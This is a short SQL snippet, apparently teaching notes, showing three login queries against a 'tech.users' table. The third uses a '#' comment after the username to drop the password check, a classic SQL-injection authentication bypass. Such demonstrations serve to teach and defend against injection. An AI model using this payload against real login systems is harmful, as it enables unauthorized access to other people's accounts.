SELECT * FROM tech.users WHERE username='Bobby45' AND password='wrongpassword'; -- wrong password, no result
SELECT * FROM tech.users WHERE username='Bobby45' AND password='secret'; -- correct password, gives result
SELECT * FROM tech.users WHERE username='Bobby45'#' AND password='secret'; -- outcomment need for password, gives result
